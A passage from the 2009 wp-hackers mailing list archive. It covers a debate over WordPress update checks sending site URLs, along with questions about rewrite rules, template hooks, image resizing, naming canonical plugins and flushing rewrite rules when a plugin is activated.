required to be sent, but can be sent without WordPress.org knowing it 
came from you. This will allow updating the site without me being there. 
It will save you such and such dollars each time or you can spend such 
and such dollars every time their is an update, but most likely you 
aren't going to spend that money as often is required so you're not 
going to update at all, which will put your site at risk.

"Even if you use another CMS, you'll have the same problem with 
security, only it may or may not take longer for the exploit to be 
fixed, may take longer before the exploit is even found, and you'll 
still have the problem where you'll be required to update. However with 
other CMSes, more often then not, you'll modify some core component that 
drastically increases the time required to properly upgrade the site 
with all of the current features."

The ethical factor kind of becomes skewed when you're being paid to do 
something, but if your boss tells you to leave a few screws loose on a 
bridge are you really going to do that? I wouldn't.

Jacob Santos

Lynne Pope wrote:
> I hear what you are saying Jacob but have to wonder if there would be more
> people seeing update notifications if some were not disabling these over
> privacy concerns. With the company I mentioned, I had no idea they had used
> these plugins to avoid sending their blog URL. I imagine there would be a
> lot of us who work with users and who don't know what they have installed
> until there is a problem.
>
> A subset of current users were around in 2007 and took note when all hell
> broke loose over the phone home. I suspect a larger proportion never see
> reports about such things. The average user doesn't see Slashdot or follow
> tech news. Since then, of course, thousands of new users have come along and
> I doubt many of them are even aware of what information gets sent back.
>
> Then there's the users who, in 2007, installed the plugins to block update
> checks (the 2.3 announcement even linked to this) and who have just
> blissfully carried on blocking. This is where the privacy concerns are
> actually hurting WordPress. If we want people to use the automatic update we
> should, in my opinion, not be giving them reasons for not using it. Sure,
> its easy to look at the numbers and say most people don't care, but its just
> as valid to say they might, if they knew about it.
>
> For my last comment on this issue I just want to ask one thing - is it so
> hard to simply remove the blog URL from being sent as part of the User-Agent
> in the core? A function is all very well (and I thank you for that) but by
> the time anyone mentions that they won't use WordPress or that they are
> using plugins to remove update notifications its already too late to help
> them out.
>
> Lynne
>
> 2009/12/8 Jacob Santos <wordpress at santosj.name>
>
>   
>> I should apologize, I realize that you are correct. It has been a long time
>> and I've forgotten a lot of the issues that were bought up at that time.
>>
>> Given the lack of popularity of the Tin-foil hat plugin compared to those
>> using WordPress, I can say that it is unlikely that any options will be
>> added. I believe it was discussed at that point, but a lot of the argument
>> against it was that if only a few are ever going to turn it on, then it
>> wasn't worth spending the time for development and testing to do it.
>>
>> As far as the business connection, I think that well, it doesn't really
>> matter what I think. I would hope that any business would weigh the
>> advantages of what WordPress offers for keeping WordPress and plugins
>> up-to-date and the time that is saved, however that is their business with
>> how they want to handle that.
>>
>> Furthermore, the lack of opt-in was intentional and there was, I believe,
>> fear that people would care more about privacy than security and opt-out
>> rather than be updated on when new releases are out. Given the apathy in the
>> past, it seemed reasonable to assume it and given recent events, it seems
>> that even with the update notifications that people are still not taking the
>> update notifications seriously.
>>
>> The Tin-foil hat plugin should solve your problems, but the code below
>> could be applied to a plugin and would do what you wish with at least the
>> useragent.
>>
>> function paranoia_remove_url($default)
>> {
>>   global $wp_version;
>>   return 'WordPress/'.$wp_version;
>> }
>>
>> add_filter('http_headers_useragent', 'paranoia_remove_url');
>>
>> For what it is worth, I'm not against your idea, it is just that there are
>> alternatives to which you speak and I'm wondering why those alternatives
>> (i.e the filters) weren't applied first to the problem before attempting to
>> change WordPress fundamentally for everyone. Also, I'll rather the
>> statistics for PHP version be sent so that PHP4 can be dropped as soon as
>> possible, unless their using PHP4, then please use the Tin-foil hat, so that
>> they'll skew the results towards quicker adoption of PHP5+.
>>
>> It should also be noted that the above will only remove the URL from the
>> useragent. The plugins and themes and wp_version will still be sent, but I
>> believe that is the only place where the Blog URL is sent.
>>
>>
>> Jacob Santos
>>
>> Lynne Pope wrote:
>>
>>     
>>> 2009/12/8 Jacob Santos <wordpress at santosj.name>
>>>
>>>
>>>
>>>       
>>>> In what way does WordPress.org or Automattic having your URL affect the
>>>> security and privacy of your site?
>>>>
>>>>
>>>>
>>>>         
>>> It compromises privacy because users are not being given the option to
>>> send
>>> or not send information about their site. It compromises security when
>>> users
>>> disable update checks in order to avoid sending information they don't
>>> wish
>>> to send.
>>>
>>> The specific response I got from the people I was working with was that
>>> business information, such as which plugins they use, is nobody's business
>>> except theirs. They consider this to be business information. Plugin and
>>> theme data contains identifying information about products and staff which
>>> they do not want broadcast to anyone.
>>>
>>>
>>>
>>>
>>>       
>>>> How does preventing WordPress.org from using this data protect you from
>>>> anything?
>>>>
>>>>
>>>>
>>>>         
>>> WordPress.org is not a legal entity and cannot therefore be held legally
>>> accountable for misuse of data. They have no confidence in WordPress.org's
>>> ability to keep the data private and confidential and say that as they do
>>> not opt-in to sharing it then wordpress.org has no legal right to collect
>>> it.
>>>
>>>
>>>
>>>
>>>       
>>>> Why doesn't the plugins available address your problems with privacy?
>>>>
>>>>
>>>> The filters were placed in for the sole purpose of overriding the URL
>>>> that
>>>> is sent and for those concern with privacy. While it could be said that
>>>> the
>>>> small amount of people who downloaded the plugin verses the much larger
>>>> amount that uses WordPress says that not enough people consider sending
>>>> an
>>>> URL is all that important. It might just be that not enough people
>>>> realize
>>>> that their WordPress is sending this information.
>>>>
>>>>
>>>>
>>>>         
>>> Which plugin just overrides the blog URL? If there is one that simply does
>>> that then I'd point them to it.
>>>
>>>
>>>
>>>
>>>       
>>>> It is but the URL, plugins, and themes, along with the PHP version that
>>>> is
>>>> sent. None of the passwords, visitors (unless you use the WordPress.com
>>>> Stats plugin), etc is sent. There is also a legitimate and reasonable
>>>> purpose behind sending this data and it is to allow for upgrading those
>>>> plugins (however, the URL isn't required, unless they changed that, but
>>>> you
>>>> could just send www.example.com if you wanted).
>>>>
>>>> By the way, the filters were a compromise to those who said to fork it.
>>>>
>>>>
>>>>
>>>>         
>>> Providing the means to check if plugins, theme, or core updates are
>>> available is great. The stickler is the sending of the blog URL (and for
>>> this company - data about custom plugins).
>>>
>>> IMO, there needs to be more transparency about what WordPress does behind
>>> the scenes and what data is collected. I understand the concerns when
>>> custom
>>> plugins & themes use staff and product names - this sends way too much
>>> identifying information!
>>>
>>> The alternative would be if WordPress only checked against theme and
>>> plugin
>>> names that are in the WordPress repository, instead of collecting data on
>>> every theme and plugin.
>>>
>>> I love the work you did on this Jacob. However, its now 2 years since
>>> wordpress.org started collecting blog URL's with the update and it's
>>> still
>>> unnecessary data capture. If WordPress.org has future plans for using this
>>> information then a simple opt-in would prevent these kinds of issues. If
>>> there is no good reason for capturing the URL then perhaps its time it was
>>> removed?
>>>
>>> Lynne
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>>       
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
>
>
>
>   

From otto at ottodestruct.com  Tue Dec  8 16:10:01 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 8 Dec 2009 10:10:01 -0600
Subject: [wp-hackers] $wp_rewrite->add_permstruct() vs.
	add_rewrite_rule()
In-Reply-To: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
Message-ID: <161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com>

A "permastruct" is a permalink structure as defined by some group of
rewrite tags. So /bob/%bob% would be a permastruct, if "bob" was a
valid rewrite tag.

What's a rewrite tag? That's a variable tag surrounded by % marks.
Just like you can use in the Permalink settings. Like %month% and
%day% and %postname% and so forth. A rewrite tag, once it's parsed out
of the URL, gets turned into some variable in the main $wp_query
object.

Adding a permastruct does (eventually) add a rewrite rule, internally.
If I were to add the permastruct of /wacky/%post_id% , then a URL of
/wacky/4 would bring up the single post with ID #4.

You can add your own rewrite tags with add_rewrite_tag, but custom
tags don't generally do anything unless you add something else to read
and use their values.

Using add_rewrite_rule directly, on the other hand, is a bit more
manual. It just defines a conversion method between a URL and another
URL. That "other" URL is very arbitrary, you can define variables
however you wish.

That help?

-Otto



On Mon, Dec 7, 2009 at 11:50 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Hi all:
>
> Okay you WP_Rewrite() gurus, now's your time to shine.
>
> So I've been trying to figure out $wp_rewrite->add_permstruct() vs. add_rewrite_rule() for the past several days. I've been able to get the former to work but not the latter. ?I'm trying to figure out when we would use one and when we would use the other?
>
> It *seems* like using add_permastruct() can get you support or things like custom single_template and that add_rewrite_rule() would require use of template_redirect, but I can't be 100% sure?
>
> Can anyone shed some light on these two? ?Google has not been my friend in the case of these two functions and how to best use them.
>
> -Mike
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jwriteclub at gmail.com  Tue Dec  8 16:57:33 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 09:57:33 -0700
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com> 
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com> 
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com> 
	<A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>
Message-ID: <81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>

I think that part of the problem (and I am at least as guilty as anyone
else) is the fragmentation of the database. We have (and will soon have
better) custom post types, I think we need to try an encourage people to
work within this structure to store and manage their data.

>

You hit the nail on the head with those two examples!  I've struggled with
> both.  There's a definite need for a standard twitter infrastructure and
> repository for tweets, and a real need for a standard approach to events.
>  I've struggled with both of them, and still am. (As an aside, my Atlanta
> Startup Weekend team worked on a project called EventTank.com which, not
> ironically, is current built on WordPress.)
>
> Aren't calendar events pretty much just a custom "event" post type? IMHO,
we need to encourage people to work with the database that's already there,
rather than automatically going for creating a new DB. On the other hand,
it's not the easiest thing in the world to use: in particular, where do you
store things? The "meta" table seems the obvious place, but then what goes
into the actual post table? An empty post? A serialization of the data? All
the data jammed together?


> But seriously, what I'm hearing here is not the need for canonical plugins
> that expose some commonly needed UI but instead the need for optional
> baseline API functionality. In each of those three cases we don't really
> need elaborate UI functionality, we need shared infrastructure that plugins
> can build on.  Downloading tweets is easy, posting tweets is easy, storing
> tweets in a standard location is easy, and designing functions to load
> tweets from the database into arrays or objects is easy. OTOH there are a
> myriad of way to display tweets customized for the site owner and to make
> tweets in a UI optimized manner. Those latter features should be the realm
> of the plugin repository and the former should be in the form of
> standardized yet optional baseline plugins.
>

I really, really agree on the shared baseline. There will always be someone
who wants slightly different baseline functionality, but there's a lot of
lower level problems that are probably solved tens if not dozens of times.
If there were "canonical" libraries I would feel much more comfortable using
them.

Finally, I want to affirmatively vote against using the word "premium". In
general usage on the web, premium means "for money", and there are lots of
"premium" things in the WP community that are for money (and lots of premium
things outside of the WP community that are for money). Appropriating the
word premium won't make those things disappear, it will just confuse people.
I think it makes sense to chose a word that implies the quality, but still
free. Canonical or Core would be my votes.

~ Christopher

From m at mullenweg.com  Tue Dec  8 17:11:18 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 08 Dec 2009 09:11:18 -0800
Subject: [wp-hackers] $wp_rewrite->add_permstruct() vs.
	add_rewrite_rule()
In-Reply-To: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
Message-ID: <4B1E88B6.8080205@mullenweg.com>

On 2009-12-07 9:50 PM, Mike Schinkel wrote:
> Can anyone shed some light on these two?  Google has not been my friend in the case of these two functions and how to best use them.

This is definitely a tricky area, if you could distill what you find 
into some info on the Codex it'll help future explorers.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From otto at ottodestruct.com  Tue Dec  8 17:30:59 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 8 Dec 2009 11:30:59 -0600
Subject: [wp-hackers] hacking image resizing
In-Reply-To: <e34a76360912072053n2abf0a8fodf874449525020af@mail.gmail.com>
References: <e34a76360912072053n2abf0a8fodf874449525020af@mail.gmail.com>
Message-ID: <161617690912080930w2e95c209pf3ee371558e803ce@mail.gmail.com>

wp_generate_attachment_metadata is what creates the various sizes, at
upload time. That's where the "sizes" metadata is created.

It does this by calling image_make_intermediate_size for each separate
size. That function calls image_resize to do the actual work of
resizing the image, which uses a few gd functions to do the bulk of
the work (imagecopyresampled, imagetruecolortopalette, imagegif,
imagepng, imagejpg, etc).

This process can fail for a few reasons. wp_load_image loads the image
from disk by doing imagecreatefromstring( file_get_contents( $file )
). So if file_get_contents is unavailable, the whole shebang fails.

Basically, if the calls to the subfunctions fail to return valid
images for whatever reason, no sizes meta gets added.

-Otto



On Mon, Dec 7, 2009 at 10:53 PM, Sergiy Kuzmenko <s.kuzmenko at gmail.com> wrote:
> I had a bit of a problem with image resizing. Images sized stay greyed out
> no matter what. GD library is enabled. In fact I tried it on two machines.
> It worked fine on my Fedora desktop but failed on on the Ubuntu (hardy)
> server. There is a thread in support forum about this (apparently I am not
> alone) so I suspected it might be a bug. Looking at the code and trying to
> find the root cause I discovered that on the ?machine where I have this
> problem the assoc. array containing image data has no "sizes" element
> required to trigger image resizing (wp-includes/media.php, function
> image_get_intermediate_size).
>
> Apparently, this assoc. array gets loaded from $wp_object_cache where it is
> supposed to be initialized somehow at an earlier stage. ?And this is where I
> get stuck. It is not very obvious which code is loading that info into
> $wp_object_cache. Doing "grep -r sizes | grep -v .js" does not reveal
> anything worth attention. I wonder if someone could elucidate me on how
> image sizes get loaded into cache.
>
> Many thanks.
> Sergiy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at xentek.net  Tue Dec  8 17:48:40 2009
From: wp at xentek.net (Eric Marden)
Date: Tue, 8 Dec 2009 12:48:40 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
	<A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>
	<81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>
Message-ID: <2CAAFB1A-34DA-42E2-A993-075AC8F0A313@xentek.net>

On Dec 8, 2009, at 11:57 AM, Christopher O'Connell wrote:

> Canonical or Core would be my votes

I voted for Core, since it already has a strong connotation in the  
community.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From kikizas at gmail.com  Tue Dec  8 18:17:55 2009
From: kikizas at gmail.com (Demetris)
Date: Tue, 8 Dec 2009 20:17:55 +0200
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <2CAAFB1A-34DA-42E2-A993-075AC8F0A313@xentek.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
	<A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>
	<81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>
	<2CAAFB1A-34DA-42E2-A993-075AC8F0A313@xentek.net>
Message-ID: <9f34a3610912081017h1e373c24pc02f3f9e666e6f25@mail.gmail.com>

I say,

Let us wait until at least one (1) ?canonical? plugin comes into life,
and we can look for names then.

Name-hunting is a bit premature at this stage, IMO.

The baby is not even an embryo yet!

Cheers!

Demetris,
http://op111.net/

From mikeschinkel at newclarity.net  Tue Dec  8 19:26:39 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 14:26:39 -0500
Subject: [wp-hackers] template_redirect vs. single_template vs. other? (was
	$wp_rewrite->add_permstruct() vs. add_rewrite_rule())
In-Reply-To: <161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>
	<161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com>
Message-ID: <D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>

Thanks Otto, yes, it helps a lot, thank you.

Now that I understand permastructs and rewrite rules better I think the follow on question regarding URL rewriting is how do you get WordPress to do what you want after  you've mapped the URL structure?  Note I changed the subject so that this thread my get indexed by Google for those keywords.

I'm at the point where I'm almost understanding that an arbitrary URL that has no need for any core support in WordPress would use template_redirect whereas one would use other hooks based on what is needed.  I've learned, thanks to Dion (dd32) that rather than hook all those nasty post_* hooks I could use the single_template hook when what I wanted to do was in essence load a post; that was so far from obvious (for me) that I never even looked there and Dion's example was the first I'd seen (the only one on the web?)

So my next question is, what hooks are available in(directly in) template-loader.php and when should we use each one of them? (I've copied the file into this email below for reference.)  For example, with single_template it appears we'd hook that when we want to have a single post loaded and ready for display; that one is more obvious now, but what about all the rest?  I think it would be a huge service for future explorers if we could collectively document all the ways you might hook templates for custom URLs and in what context you would use each hook for the benefit of future explorers and then, as Matt requests, move to the Codex.

-Mike

<?php
/**
 * Loads the correct template based on the visitor's url
 * @package WordPress
 */
if ( defined('WP_USE_THEMES') && constant('WP_USE_THEMES') ) {
	do_action('template_redirect');
	if ( is_robots() ) {
		do_action('do_robots');
		return;
	} else if ( is_feed() ) {
		do_feed();
		return;
	} else if ( is_trackback() ) {
		include(ABSPATH . 'wp-trackback.php');
		return;
	} else if ( is_404() && $template = get_404_template() ) {
		include($template);
		return;
	} else if ( is_search() && $template = get_search_template() ) {
		include($template);
		return;
	} else if ( is_tax() && $template = get_taxonomy_template()) {
		include($template);
		return;
	} else if ( is_home() && $template = get_home_template() ) {
		include($template);
		return;
	} else if ( is_attachment() && $template = get_attachment_template() ) {
		remove_filter('the_content', 'prepend_attachment');
		include($template);
		return;
	} else if ( is_single() && $template = get_single_template() ) {
		include($template);
		return;
	} else if ( is_page() && $template = get_page_template() ) {
		include($template);
		return;
	} else if ( is_category() && $template = get_category_template()) {
		include($template);
		return;
	} else if ( is_tag() && $template = get_tag_template()) {
		include($template);
		return;
	} else if ( is_author() && $template = get_author_template() ) {
		include($template);
		return;
	} else if ( is_date() && $template = get_date_template() ) {
		include($template);
		return;
	} else if ( is_archive() && $template = get_archive_template() ) {
		include($template);
		return;
	} else if ( is_comments_popup() && $template = get_comments_popup_template() ) {
		include($template);
		return;
	} else if ( is_paged() && $template = get_paged_template() ) {
		include($template);
		return;
	} else if ( file_exists(TEMPLATEPATH . "/index.php") ) {
		include(TEMPLATEPATH . "/index.php");
		return;
	}
} else {
	// Process feeds and trackbacks even if not using themes.
	if ( is_robots() ) {
		do_action('do_robots');
		return;
	} else if ( is_feed() ) {
		do_feed();
		return;
	} else if ( is_trackback() ) {
		include(ABSPATH . 'wp-trackback.php');
		return;
	}
}

?>



On Dec 8, 2009, at 11:10 AM, Otto wrote:

> A "permastruct" is a permalink structure as defined by some group of
> rewrite tags. So /bob/%bob% would be a permastruct, if "bob" was a
> valid rewrite tag.
> 
> What's a rewrite tag? That's a variable tag surrounded by % marks.
> Just like you can use in the Permalink settings. Like %month% and
> %day% and %postname% and so forth. A rewrite tag, once it's parsed out
> of the URL, gets turned into some variable in the main $wp_query
> object.
> 
> Adding a permastruct does (eventually) add a rewrite rule, internally.
> If I were to add the permastruct of /wacky/%post_id% , then a URL of
> /wacky/4 would bring up the single post with ID #4.
> 
> You can add your own rewrite tags with add_rewrite_tag, but custom
> tags don't generally do anything unless you add something else to read
> and use their values.
> 
> Using add_rewrite_rule directly, on the other hand, is a bit more
> manual. It just defines a conversion method between a URL and another
> URL. That "other" URL is very arbitrary, you can define variables
> however you wish.
> 
> That help?
> 
> -Otto
> 
> 
> 
> On Mon, Dec 7, 2009 at 11:50 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> Hi all:
>> 
>> Okay you WP_Rewrite() gurus, now's your time to shine.
>> 
>> So I've been trying to figure out $wp_rewrite->add_permstruct() vs. add_rewrite_rule() for the past several days. I've been able to get the former to work but not the latter.  I'm trying to figure out when we would use one and when we would use the other?
>> 
>> It *seems* like using add_permastruct() can get you support or things like custom single_template and that add_rewrite_rule() would require use of template_redirect, but I can't be 100% sure?
>> 
>> Can anyone shed some light on these two?  Google has not been my friend in the case of these two functions and how to best use them.
>> 
>> -Mike
>> 
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From otto at ottodestruct.com  Tue Dec  8 19:54:26 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 8 Dec 2009 13:54:26 -0600
Subject: [wp-hackers] template_redirect vs. single_template vs. other?
	(was $wp_rewrite->add_permstruct() vs. add_rewrite_rule())
In-Reply-To: <D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>
References: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net> 
	<161617690912080810s5e2ced52r4e758965e1939b48@mail.gmail.com> 
	<D1F2280D-3CD4-4CE2-9FCF-5767B760694F@newclarity.net>
Message-ID: <161617690912081154o24129d41n4b14d358d7aca808@mail.gmail.com>

Well, it depends on what exactly you want to do. Hard to say without
knowing that, precisely.

You'd use template_loader when you want to bypass the templates system
altogether. Basically, templates are all the files in the theme
hierarchy. Single.php, page,php, category-x.php, archive.php, etc. All
these templates can be overriden directly, of course, so
template_loader is for when you want to go completely outside the
norm.

For the *_templates, the actual filter is performed on
{$type}_template, where type is the argument to get_query_template. So
you can override any of them. 404, author, archive, date, paged,
search, single, attachment, and any mime type attachments (text/plain
would be "text" and "plain" and "text_plain", image/gif would be
"image", then "gif", then "image_gif", etc...). So it's pretty wide
open there.

Which branch of the hierarchy is examined depends on the contents of
the $wp_query. If is_single gets set (because you got a single post),
then it goes to the single branch first, etc.


In essence, you need to determine three things.
1. What do the URLs look like?
2. What posts should be pulled?
3. What template file should be loaded?

Each of these will be handled separately, however some of them can be
skipped or made simpler if there's already support in WordPress for
that specific case. In the case of "pulling one and only one post",
then wp_query can already do that (by setting the %post_id%), and the
single branch of the template hierarchy handles that just fine. In the
case of pulling, say, custom post types, then it's a tad more
complicated.

-Otto



On Tue, Dec 8, 2009 at 1:26 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Thanks Otto, yes, it helps a lot, thank you.
>
> Now that I understand permastructs and rewrite rules better I think the follow on question regarding URL rewriting is how do you get WordPress to do what you want after ?you've mapped the URL structure? ?Note I changed the subject so that this thread my get indexed by Google for those keywords.
>
> I'm at the point where I'm almost understanding that an arbitrary URL that has no need for any core support in WordPress would use template_redirect whereas one would use other hooks based on what is needed. ?I've learned, thanks to Dion (dd32) that rather than hook all those nasty post_* hooks I could use the single_template hook when what I wanted to do was in essence load a post; that was so far from obvious (for me) that I never even looked there and Dion's example was the first I'd seen (the only one on the web?)
>
> So my next question is, what hooks are available in(directly in) template-loader.php and when should we use each one of them? (I've copied the file into this email below for reference.) ?For example, with single_template it appears we'd hook that when we want to have a single post loaded and ready for display; that one is more obvious now, but what about all the rest? ?I think it would be a huge service for future explorers if we could collectively document all the ways you might hook templates for custom URLs and in what context you would use each hook for the benefit of future explorers and then, as Matt requests, move to the Codex.

From aaron at xavisys.com  Tue Dec  8 21:29:55 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Tue, 08 Dec 2009 14:29:55 -0700
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <86420BEE-429A-4DAB-904B-895E8811F18A@newclarity.net>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>	<4B1DF025.9050801@mullenweg.com>	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>	<7f49e8010912072346h204cdc13gba0ebd858a7bcd6@mail.gmail.com>
	<86420BEE-429A-4DAB-904B-895E8811F18A@newclarity.net>
Message-ID: <4B1EC553.50901@xavisys.com>

I have two plugins like this (MailChimp Framework 
<http://wordpress.org/extend/plugins/mailchimp-framework/> and PayPal 
Framework <http://wordpress.org/extend/plugins/paypal-framework/>).  I 
really don't think they belong in Core, and I'm also not sure they 
really belong as canonical plugins.  Since they're only really useful to 
other programmers, I think they're perfectly fine just staying in the 
wordpress.org repository as a general plugin.

Mike Schinkel wrote:
> On Dec 8, 2009, at 2:46 AM, Pete Mall wrote:
>   
>> I've been working on a Twitter API and Google Data Protocol WordPress Client
>> Library using WP_Http. It'll take care of the authentication and data
>> transfer and would be easily extensible. A plugin writer would be able to
>> use these libraries instead of re-inventing the wheel. If anyone is
>> interested in contributing to these projects, please reply directly to me.
>>     
>
> Thanks Pete,  Perfect example of what I was discussing!
>
> So I'll ask others here, are these types of things appropriate or not appropriate to add to the core?  My guess is that most people on the list will chorus "that doesn't belong in the core!"  That's not my opinion, but am I wrong?
>
> From my perspective it would be much better if there could be one API for plugins to program for these types of things instead of many, especially if there is a need for shared data or layering of functionality.  However, such functionality is a no-mans land for WordPress and it advancement is thus stunted; said functionality doesn't fit in the core by most people's account, "market forces" don't foster its standardized across many plugins and there is nowhere else for it to go.  
>
> To solve this?  One of:
>   
> 1.) Start allowing this kind of stuff into the core,
> 2.) Support this kind of thing in the new canonical plugins, or 
> 3.) Add a 3rd entity, like canonical plugins in that they would be an official list without duplication but for APIs instead of end user functionality.
>
> -Mike
>
> ___________


From matt at mattjacob.com  Tue Dec  8 22:39:50 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Tue, 8 Dec 2009 15:39:50 -0700
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
Message-ID: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>

Currently, in my callback that gets attached to
register_activation_hook(), I'm flushing the rewrite rules via the
init hook:

    add_action('init', array($this, 'FlushRewriteRules'));

My FlushRewriteRules() function is 2 lines:

    global $wp_rewrite;
    $wp_rewrite->flush_rules();

In the function that runs every time my plugin is loaded, I'm
filtering the rewrite_rules_array with this:

    add_filter('rewrite_rules_array', array($this, 'InsertRewriteRules'));

And my InsertRewriteRules() function just returns a union of the new
rules and the existing rules. Pretty simple, right?

My question, then, is whether I'm doing it wrong. When my plugin is
activated, do I need to *explicitly* filter rewrite_rules_array and
*explicitly* call flush_rules() instead of hooking into init? i.e.,
should my callback for register_activation_hook actually do the work
itself?

Anecdotal evidence seems to suggest that I'm doing it wrong, because
some people have to manually go to Settings > Permalinks > Save
Changes in order for my rewrite rules to take effect. I didn't
encounter that during my testing, but that's what users are reporting.

Thanks for any insights,

Matt

From jwriteclub at gmail.com  Tue Dec  8 22:46:30 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 15:46:30 -0700
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <4B1EC553.50901@xavisys.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com> 
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com> 
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<7f49e8010912072346h204cdc13gba0ebd858a7bcd6@mail.gmail.com> 
	<86420BEE-429A-4DAB-904B-895E8811F18A@newclarity.net>
	<4B1EC553.50901@xavisys.com>
Message-ID: <81d01c0912081446q1aa09ba7h4bf59c382a7e6a44@mail.gmail.com>

Here's the problem with that: If there's not a canonical version, there's
potential side effects and conflicts. Furthermore, those additional plugins
have to be sent along with plugins. Then, you potentially end up with
several plugins, each of which has a different (and potentially conflicting
version) of the same library. Or, the user has to manually install a bunch
of libraries. Plugins really need to be able to get their own dependencies,
possibly prompting the user as to whether they can install the dependency.

~ Christopher

On Tue, Dec 8, 2009 at 2:29 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:

> I have two plugins like this (MailChimp Framework <
> http://wordpress.org/extend/plugins/mailchimp-framework/> and PayPal
> Framework <http://wordpress.org/extend/plugins/paypal-framework/>).  I
> really don't think they belong in Core, and I'm also not sure they really
> belong as canonical plugins.  Since they're only really useful to other
> programmers, I think they're perfectly fine just staying in the
> wordpress.org repository as a general plugin.
>
>
> Mike Schinkel wrote:
>
>> On Dec 8, 2009, at 2:46 AM, Pete Mall wrote:
>>
>>
>>> I've been working on a Twitter API and Google Data Protocol WordPress
>>> Client
>>> Library using WP_Http. It'll take care of the authentication and data
>>> transfer and would be easily extensible. A plugin writer would be able to
>>> use these libraries instead of re-inventing the wheel. If anyone is
>>> interested in contributing to these projects, please reply directly to
>>> me.
>>>
>>>
>>
